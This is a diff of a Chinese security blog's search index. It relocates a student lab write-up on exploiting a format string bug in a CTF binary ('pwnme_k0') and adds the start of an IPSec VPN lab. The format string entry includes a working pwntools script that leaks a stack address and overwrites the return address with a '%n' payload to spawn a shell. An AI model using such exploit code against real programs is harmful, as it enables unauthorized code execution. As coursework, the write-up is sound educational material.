-<p><code>call 0x400770</code> 应该是 <code>printf</code> 的地址，stack 中，栈顶是 rbp，第二个是返回地址 <code>0x400d74</code>，第三个是代表用户名的字符串 <code>aaa</code>，<code>printf</code> 的参数。又因为 64 位系统中，函数前六个参数分别放在寄存器 RDI，RSI，RDX，RCX，R8 和 R9 上，除了存放格式化字符串的 rdi 参数，栈顶元素应该在第 5+1=6 个位置上（越过 R9）。从 rbp 的输出可以计算出返回地址偏移为 0x7fffffffddc0-0x7fffffffdd80+8 (64 位系统的一个存储块为 8 个字节)=0x48。设置 <code>username</code> 为 <code>%6$p</code> 即可获取栈顶元素内容，减掉偏移 <code>0x48</code> 得到返回地址在栈中位置</p>
- <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/11.png" class="">
-</li>
-<li>
-<p>下一步修改，需要利用 <code>edit</code> 函数将 <code>username</code> 修改为返回地址在栈中的地址，<code>password</code> 修改为用于攻击的格式化字符串。<code>username</code> 是格式化字符串的第 8 个参数，通过 <code>%8$hn</code> 向第 8 个参数所指向的位置中写入 <code>0x08a6</code>(十进制为 <code>2214</code>) 两个字节实现对返回地址的覆写</p>
-</li>
-<li>
-<p>最终利用 payload 如下所示，为方便理解，对于一些操作做了封装。</p>
-<figure class="highlight python"><figcaption><span>payload.py</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">   <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">   context.log_level=<span class="string">'debug'</span></span><br><span class="line">   p = process(<span class="string">'./pwnme_k0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">username,password</span>):</span><br><span class="line">    p.recvuntil(<span class="string">"Input your username(max lenth:20):"</span>)</span><br><span class="line">    p.sendline(username)</span><br><span class="line">    p.recvuntil(<span class="string">"Input your password(max lenth:20):"</span>)</span><br><span class="line">    p.sendline(password)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">username,password</span>):</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"please input new username(max lenth:20):"</span>)</span><br><span class="line">    p.sendline(username)</span><br><span class="line">    p.recvuntil(<span class="string">"please input new password(max lenth:20):"</span>)</span><br><span class="line">    p.sendline(password)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">debugs=(<span class="params"><span class="literal">True</span>,<span class="literal">True</span></span>)</span>):</span><br><span class="line">    <span class="comment"># return-addr:0x400d74 -&gt; system:0x4008a6</span></span><br><span class="line">	<span class="comment"># libc = ELF('libc.so')</span></span><br><span class="line">	debug1,debug2=debugs</span><br><span class="line">	register(<span class="string">"%6$p"</span>,<span class="string">"bbb"</span>)</span><br><span class="line">	offset = <span class="number">0x7fffffffddc0</span> - <span class="number">0x7fffffffdd80</span> + <span class="number">8</span></span><br><span class="line">	show()</span><br><span class="line">	stack_top = <span class="built_in">int</span>(p.recvline()[<span class="number">2</span>:<span class="number">14</span>],<span class="number">16</span>)</span><br><span class="line">	return_addr = stack_top-offset</span><br><span class="line">	<span class="built_in">print</span> <span class="string">"[*]stack top:0x%x"</span>%stack_top</span><br><span class="line">	<span class="built_in">print</span> <span class="string">"[*]offset:0x%x"</span>%offset</span><br><span class="line">	<span class="built_in">print</span> <span class="string">"[*]return_addr in stack:0x%x"</span>%return_addr</span><br><span class="line">	<span class="keyword">if</span> debug1:</span><br><span class="line">		gdb.attach(p,<span class="string">'b *0x400b28'</span>)</span><br><span class="line">		quit()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		edit(username=p64(return_addr),password=<span class="string">"%2214c%8$hn"</span>)</span><br><span class="line">		<span class="comment"># 2114 is the decimal value of 0x08a6</span></span><br><span class="line">		<span class="keyword">if</span> debug2:</span><br><span class="line">			gdb.attach(p,<span class="string">'b *0x400b28'</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			show()</span><br><span class="line">		p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    solve(debugs=(<span class="literal">False</span>,<span class="literal">False</span>))</span><br><span class="line">   </span><br></pre></td></tr></tbody></table></figure>
-</li>
-</ol>
-<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/%E6%9C%80%E7%BB%881.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/%E6%9C%80%E7%BB%882.png" class=""></div></div></div>
-<h2 id="实验难点与收获">实验难点与收获</h2>
-<p>本次实验的难点在于漏洞的利用，如何构造出 “致命” 的格式化字符串是最难的地方。格式化字符串漏洞的利用点不难分析，它利用了 <code>printf</code> 的格式化字符与参数数量不匹配的毛病，泄露内存地址，从而计算出一些信息。类似于 <code>printf(buf)</code> 的形式很容易输出程序地址信息，更可能引起内存覆写。</p>
-<p><code>%n</code> 是格式化字符串漏洞的关键，它完成了将所输入的内容直接写入内存地址空间的操作。基本上可以说是 pwn 中 getshell 前的最后一步。</p>
-<p>在写漏洞利用脚本时需要注意各种小问题，比如不可直接书写地址，地址的大小端，数据的进制，<code>recv</code> 和 <code>recvline</code> 的区别等。经过几轮调试后，终于写成了可以用的脚本。</p>
-<h2 id="实验思考">实验思考</h2>
-<p>上述脚本中，“向第 8 个参数所指向的位置写东西” 使用的格式化字符为 <code>%8$hn</code>，而课件上和课上讲的是 <code>$hhn</code>，这两个有什么区别？</p>
-<blockquote><p><code>%$hn</code> 表示写入的地址空间为 2 字节，<code>%$hhn</code> 表示写入的地址空间为 1 字节，<code>%$lln</code> 表示写入的地址空间为 8 字节，在 32bit 和 64bit 环境下一样。有时，直接写 4 字节 <code>%n</code> 会导致程序崩溃或等候时间过长，可以通过 <code>%$hn</code> 或 <code>%$hhn</code> 来适时调整。</p>
-<footer><strong>Yable 的格式化字符串利用小结 </strong><cite><a href="https://www.cnblogs.com/Yable/p/7895732.html">www.cnblogs.com/Yable/p/7895732.html</a></cite></footer></blockquote>
-]]></content>
-      <categories>
-        <category>实验</category>
-        <category>漏洞分析</category>
-        <category>漏洞</category>
-        <category>格式化字符串</category>
-      </categories>
-      <tags>
-        <tag>网络空间安全</tag>
-        <tag>软件安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ARP 欺骗</title>
     <url>/2019/09/29/experiments/security/web/arp/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="目标">目标</h2>
@@ -5604,6 +5516,102 @@ ARP 协议没有认证机制，只要接收到的协议包是有效的，主机�
       <tags>
         <tag>网络空间安全</tag>
         <tag>网络安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>格式化字符串漏洞</title>
+    <url>/2019/11/14/experiments/security/vulnerability_analysis/string-format/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="实验目的">实验目的</h2>
+<p>掌握格式化字符串漏洞的原理以及在漏洞利用中的应用。</p>
+<span id="more"></span>
+<h2 id="步骤">步骤</h2>
+<ol>
+<li>
+<p>运行程序，大概走一遍流程 </p><div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/1.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/2.png" class=""></div></div></div><p></p>
+</li>
+<li>
+<p>首先，程序接受最大 20 字节长的 “用户名” 和 “密码” 传入，注册成功后，会有三个选项：查看信息，修改信息和退出。</p>
+</li>
+<li>
+<p>用 ida 打开程序，搜索相关标志，发现程序首先调用了 <code>sub_4008BB()</code>，它输出了我们看到的 <code>banner</code>，并冲洗了标准输出（通过调用 <code>fflush(stdout)</code>）。 <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/3.png" class=""></p>
+</li>
+<li>
+<p>从 <code>sub4008bb</code> 跟回到 <code>main</code> 函数，发现接下来是一个 “注册” 过程，由 <code>sub_400903</code> 函数负责。</p>
+ <figure class="highlight c"><figcaption><span>sub_400903</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int8 v12; <span class="comment">// [rsp+1Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Register Account first!"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Input your username(max lenth:20): "</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">v12 = read(<span class="number">0</span>, &amp;bufa, <span class="number">0x14</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( v12 &amp;&amp; v12 &lt;= <span class="number">0x14</span>u )</span><br><span class="line">{</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your password(max lenth:20): "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  read(<span class="number">0</span>, (<span class="type">char</span> *)&amp;a9 + <span class="number">4</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *(_QWORD *)buf = bufa;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">8</span>) = a8;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">16</span>) = a9;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">24</span>) = a10;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">32</span>) = a11;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">  LOBYTE(bufa) = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"error length(username)!try again"</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *(_QWORD *)buf = bufa;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">8</span>) = a8;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">16</span>) = a9;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">24</span>) = a10;</span><br><span class="line">  *(_QWORD *)(buf + <span class="number">32</span>) = a11;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> buf;</span><br></pre></td></tr></tbody></table></figure>
+<p>使用 <code>read</code> 函数只将 20 字节数据读入，除此以外，所有的 <code>puts</code> 和 <code>read</code> 后都跟着一个 <code>fflush</code>，强行冲洗缓冲区。看来，缓冲区的毛病应该利用不上了。</p>
+</li>
+<li>
+<p>接下来是 <code>sub_400d2b</code> 函数，这是程序的后半部分 —— 选择输出、修改信息或退出程序。</p>
+ <figure class="highlight c"><figcaption><span>sub_400d2b</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    v8 = sub_400A75();</span><br><span class="line">    <span class="keyword">switch</span> ( v8 )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        sub_400B41((__int64)&amp;sa, <span class="number">0LL</span>, v9, v10, v11);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> sub_400D1A(v7, <span class="number">0LL</span>);</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        sub_400B07((<span class="type">char</span>)v7, <span class="number">0</span>, v9, v10, v11, v12);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"error options"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    v7 = <span class="built_in">stdout</span>;</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure>
+<ul>
+<li>其中 <code>sub_400a75</code> 输出了三个选项的内容  <figure class="highlight c"><figcaption><span>sub_400a75</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"1.Sh0w Account Infomation!"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"2.Ed1t Account Inf0mation!"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"3.QUit sangebaimao:("</span>);</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><code>sub_400b41</code>（选择 2）修改已注册用户名的信息  <figure class="highlight c"><figcaption><span>sub_400b41</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"please input new username(max lenth:20): "</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line">v15 = read(<span class="number">0</span>, &amp;buf, <span class="number">0x12C</span>uLL);</span><br><span class="line"><span class="keyword">if</span> ( v15 &lt;= <span class="number">0</span> || v15 &gt; <span class="number">20</span> )</span><br><span class="line">{</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"len error(max lenth:20)!try again.."</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *(_QWORD *)s = sa;</span><br><span class="line">  *(_QWORD *)(s + <span class="number">8</span>) = a8;</span><br><span class="line">  *(_QWORD *)(s + <span class="number">16</span>) = desta;</span><br><span class="line">  *(_QWORD *)(s + <span class="number">24</span>) = a10;</span><br><span class="line">  *(_QWORD *)(s + <span class="number">32</span>) = a11;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">  <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)&amp;sa, &amp;buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"please input new password(max lenth:20): "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v14 = read(<span class="number">0</span>, &amp;src, <span class="number">0x12C</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v14 &amp;&amp; v14 &lt;= <span class="number">0x14</span>u )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">char</span> *)&amp;desta + <span class="number">4</span>, <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">    sub_400AE5(&amp;src, <span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">char</span> *)&amp;desta + <span class="number">4</span>, &amp;src, v14);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    *(_QWORD *)s = sa;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">8</span>) = a8;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">16</span>) = desta;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">24</span>) = a10;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">32</span>) = a11;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"len error(max lenth:10)!try again.."</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    *(_QWORD *)s = sa;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">8</span>) = a8;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">16</span>) = desta;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">24</span>) = a10;</span><br><span class="line">    *(_QWORD *)(s + <span class="number">32</span>) = a11;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><code>sub_400D1A</code>（选择 3）输出了退出信息</li>
+<li><code>sub_400B07</code>（选择 1）输出了用户的信息  <figure class="highlight c"><figcaption><span>sub_400b07</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">write(<span class="number">0</span>, <span class="string">"Welc0me to sangebaimao!\n"</span>, <span class="number">0x1A</span>uLL);</span><br><span class="line marked"><span class="built_in">printf</span>(&amp;formata, <span class="string">"Welc0me to sangebaimao!\n"</span>);</span><br><span class="line marked"><span class="keyword">return</span> <span class="built_in">printf</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;a9 + <span class="number">4</span>);</span><br></pre></td></tr></tbody></table></figure>
+<ul>
+<li>显然此处存在格式化字符串漏洞，在输出用户名和密码时都使用了 <code>printf(buf)</code> 的格式。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>确定保护</p>
+ <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">checksec --file pwnme_k0</span><br></pre></td></tr></tbody></table></figure>
+ <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/5.png" class="">
+<ul>
+<li>本题开启了 RELRO 保护，将不能对 GOT 表进行写操作，但可以通过覆写返回地址获取 shell。采用的思路是：先泄露出返回地址字段的位置，然后利用 <code>%n</code> 实现覆写。</li>
+</ul>
+</li>
+<li>
+<p>开始利用</p>
+<ul>
+<li>
+<p>在 <code>4008a6</code> 处找到了 <code>/bin/sh</code> 字符串，结合下方的 call system，这里实现了一个完整的 <code>system('/bin/sh')</code>，因此只要把返回地址写成这个地址就可以了。</p>
+ <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/6.png" class="">
+</li>
+<li>
+<p>那么，返回地址在哪里呢？就从那个有漏洞的 <code>sub_400b07</code> 下手。</p>
+</li>
+</ul>
+</li>
+<li>
+<p>在 <code>0x400b28</code> 的 <code>printf</code> 上下断点</p>
+ <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/7.png" class=""> <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/8.png" class="">
+ <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/9.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/10.png" class=""></div></div></div>
+</li>
+<li>
+<p><code>call 0x400770</code> 应该是 <code>printf</code> 的地址，stack 中，栈顶是 rbp，第二个是返回地址 <code>0x400d74</code>，第三个是代表用户名的字符串 <code>aaa</code>，<code>printf</code> 的参数。又因为 64 位系统中，函数前六个参数分别放在寄存器 RDI，RSI，RDX，RCX，R8 和 R9 上，除了存放格式化字符串的 rdi 参数，栈顶元素应该在第 5+1=6 个位置上（越过 R9）。从 rbp 的输出可以计算出返回地址偏移为 0x7fffffffddc0-0x7fffffffdd80+8 (64 位系统的一个存储块为 8 个字节)=0x48。设置 <code>username</code> 为 <code>%6$p</code> 即可获取栈顶元素内容，减掉偏移 <code>0x48</code> 得到返回地址在栈中位置</p>
+ <img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/11.png" class="">
+</li>
+<li>
+<p>下一步修改，需要利用 <code>edit</code> 函数将 <code>username</code> 修改为返回地址在栈中的地址，<code>password</code> 修改为用于攻击的格式化字符串。<code>username</code> 是格式化字符串的第 8 个参数，通过 <code>%8$hn</code> 向第 8 个参数所指向的位置中写入 <code>0x08a6</code>(十进制为 <code>2214</code>) 两个字节实现对返回地址的覆写</p>
+</li>
+<li>
+<p>最终利用 payload 如下所示，为方便理解，对于一些操作做了封装。</p>
+<figure class="highlight python"><figcaption><span>payload.py</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line">   <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">   context.log_level=<span class="string">'debug'</span></span><br><span class="line">   p = process(<span class="string">'./pwnme_k0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">username,password</span>):</span><br><span class="line">    p.recvuntil(<span class="string">"Input your username(max lenth:20):"</span>)</span><br><span class="line">    p.sendline(username)</span><br><span class="line">    p.recvuntil(<span class="string">"Input your password(max lenth:20):"</span>)</span><br><span class="line">    p.sendline(password)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">username,password</span>):</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"please input new username(max lenth:20):"</span>)</span><br><span class="line">    p.sendline(username)</span><br><span class="line">    p.recvuntil(<span class="string">"please input new password(max lenth:20):"</span>)</span><br><span class="line">    p.sendline(password)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">debugs=(<span class="params"><span class="literal">True</span>,<span class="literal">True</span></span>)</span>):</span><br><span class="line">    <span class="comment"># return-addr:0x400d74 -&gt; system:0x4008a6</span></span><br><span class="line">	<span class="comment"># libc = ELF('libc.so')</span></span><br><span class="line">	debug1,debug2=debugs</span><br><span class="line">	register(<span class="string">"%6$p"</span>,<span class="string">"bbb"</span>)</span><br><span class="line">	offset = <span class="number">0x7fffffffddc0</span> - <span class="number">0x7fffffffdd80</span> + <span class="number">8</span></span><br><span class="line">	show()</span><br><span class="line">	stack_top = <span class="built_in">int</span>(p.recvline()[<span class="number">2</span>:<span class="number">14</span>],<span class="number">16</span>)</span><br><span class="line">	return_addr = stack_top-offset</span><br><span class="line">	<span class="built_in">print</span> <span class="string">"[*]stack top:0x%x"</span>%stack_top</span><br><span class="line">	<span class="built_in">print</span> <span class="string">"[*]offset:0x%x"</span>%offset</span><br><span class="line">	<span class="built_in">print</span> <span class="string">"[*]return_addr in stack:0x%x"</span>%return_addr</span><br><span class="line">	<span class="keyword">if</span> debug1:</span><br><span class="line">		gdb.attach(p,<span class="string">'b *0x400b28'</span>)</span><br><span class="line">		quit()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		edit(username=p64(return_addr),password=<span class="string">"%2214c%8$hn"</span>)</span><br><span class="line">		<span class="comment"># 2114 is the decimal value of 0x08a6</span></span><br><span class="line">		<span class="keyword">if</span> debug2:</span><br><span class="line">			gdb.attach(p,<span class="string">'b *0x400b28'</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			show()</span><br><span class="line">		p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    solve(debugs=(<span class="literal">False</span>,<span class="literal">False</span>))</span><br><span class="line">   </span><br></pre></td></tr></tbody></table></figure>
+</li>
+</ol>
+<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/%E6%9C%80%E7%BB%881.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/14/experiments/security/vulnerability_analysis/string-format/%E6%9C%80%E7%BB%882.png" class=""></div></div></div>
+<h2 id="实验难点与收获">实验难点与收获</h2>
+<p>本次实验的难点在于漏洞的利用，如何构造出 “致命” 的格式化字符串是最难的地方。格式化字符串漏洞的利用点不难分析，它利用了 <code>printf</code> 的格式化字符与参数数量不匹配的毛病，泄露内存地址，从而计算出一些信息。类似于 <code>printf(buf)</code> 的形式很容易输出程序地址信息，更可能引起内存覆写。</p>
+<p><code>%n</code> 是格式化字符串漏洞的关键，它完成了将所输入的内容直接写入内存地址空间的操作。基本上可以说是 pwn 中 getshell 前的最后一步。</p>
+<p>在写漏洞利用脚本时需要注意各种小问题，比如不可直接书写地址，地址的大小端，数据的进制，<code>recv</code> 和 <code>recvline</code> 的区别等。经过几轮调试后，终于写成了可以用的脚本。</p>
+<h2 id="实验思考">实验思考</h2>
+<p>上述脚本中，“向第 8 个参数所指向的位置写东西” 使用的格式化字符为 <code>%8$hn</code>，而课件上和课上讲的是 <code>$hhn</code>，这两个有什么区别？</p>
+<blockquote><p><code>%$hn</code> 表示写入的地址空间为 2 字节，<code>%$hhn</code> 表示写入的地址空间为 1 字节，<code>%$lln</code> 表示写入的地址空间为 8 字节，在 32bit 和 64bit 环境下一样。有时，直接写 4 字节 <code>%n</code> 会导致程序崩溃或等候时间过长，可以通过 <code>%$hn</code> 或 <code>%$hhn</code> 来适时调整。</p>
+<footer><strong>Yable 的格式化字符串利用小结 </strong><cite><a href="https://www.cnblogs.com/Yable/p/7895732.html">www.cnblogs.com/Yable/p/7895732.html</a></cite></footer></blockquote>
+]]></content>
+      <categories>
+        <category>实验</category>
+        <category>漏洞分析</category>
+        <category>漏洞</category>
+        <category>格式化字符串</category>
+      </categories>
+      <tags>
+        <tag>网络空间安全</tag>
+        <tag>软件安全</tag>
       </tags>
   </entry>
   <entry>
@@ -5890,6 +5898,93 @@ IP 地址为 49.235.250.44（现在已更换，所以不作打码处理咯～）
       </tags>
   </entry>
   <entry>
+    <title>虚拟专用网实验</title>
+    <url>/2019/12/05/experiments/security/web/vpn/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="目标">目标</h2>
+<p>了解什么是虚拟专用网（VPN），知道 VPN 的原理和应用。通过实验理解 IPSec 和 VPN 的关系和必要性。</p>
+<span id="more"></span>
+<div class="note danger"><p>本篇文章为实验记录，仅供交流学习使用，切勿违法应用，所有文中提到的工具不提供下载。</p>
+</div>
+<h2 id="原理">原理</h2>
+<h3 id="虚拟专用网-VPN-1">虚拟专用网 (VPN)[^1]</h3>
+<p>虚拟专用网（Virtual Private Network，VPN）是利用 Internet 等公共网络的基础设施，通过隧道技术，为用户提供的与专用网络具有相同通信功能的安全数据通道。“虚拟” 是指用户无需建立各自专用的物理线路，而利用 Internet 等公共网络资源和设备建立一条逻辑上的专用数据通道，并实现与专用数据通道相同的通信功能。“专用网络” 是指虚拟出来的网络并非任何连接在公共网络上的用户都能使用，只有经过授权的用户才可使用。</p>
+<p>该通道内传输数据经过加密和认证，可保证传输内容的完整性和机密性。</p>
+<h3 id="IPSec">IPSec</h3>
+<p>互联网安全协议（英语：Internet Protocol Security，缩写为 IPsec），是一个协议包，通过对 IP 协议的分组进行加密和认证来保护 IP 协议的网络传输协议族（一些相互关联的协议的集合）。由认证头（AH）、封装安全载荷（ESP）、安全关联（SA）组成。</p>
+<p>IPSec 被设计用来提供入口之间和端到端之间的通信安全，无论哪一种模式都可以用来构建虚拟专用网（VPN）。</p>
+<h2 id="步骤和关键技术">步骤和关键技术</h2>
+<h3 id="IPSec协议配置">IPSec 协议配置</h3>
+<div class="note info"><p>Windows XP 端的 IP 为 192.168.235.136，Windows 2000 端的 IP 为 192.168.235.141</p>
+</div>
+<ol>
+<li>
+<p>在 WindowsXP 下打开 “控制面板→管理工具→本地安全策略”，找到 “IP 安全策略，在本地计算机”。双击进入。然后右击 “安全服务器”，点击指派规则。<img data-src="/2019/12/05/experiments/security/web/vpn/1.png" class=""> <img data-src="/2019/12/05/experiments/security/web/vpn/2.png" class=""></p>
+</li>
+<li>
+<p>双击 “安全服务器” 进入其设置，双击 “所有 ICMP 通讯量” 进入规则设置。<img data-src="/2019/12/05/experiments/security/web/vpn/3.png" class=""></p>
+</li>
+<li>
+<p>在 “筛选器操作” 选项卡中，选择 “需要安全”。<img data-src="/2019/12/05/experiments/security/web/vpn/4.png" class=""></p>
+</li>
+<li>
+<p>在 “身份验证方法” 选项卡中，添加一个共享密钥。记住此密钥，在另一端要做同样的设置。 <img data-src="/2019/12/05/experiments/security/web/vpn/5.png" class="" title="身份验证方法选项卡"></p>
+ <div class="tabs" id="key"><ul class="nav-tabs"><li class="tab active"><a href="#key-1">XP 端</a></li><li class="tab"><a href="#key-2">2000 端</a></li></ul><div class="tab-content"><div class="tab-pane active" id="key-1"><img data-src="/2019/12/05/experiments/security/web/vpn/6.png" class="" title="设置共享密钥"></div><div class="tab-pane" id="key-2"><img data-src="/2019/12/05/experiments/security/web/vpn/7.png" class="" title="设置共享密钥"></div></div></div>
+</li>
+<li>
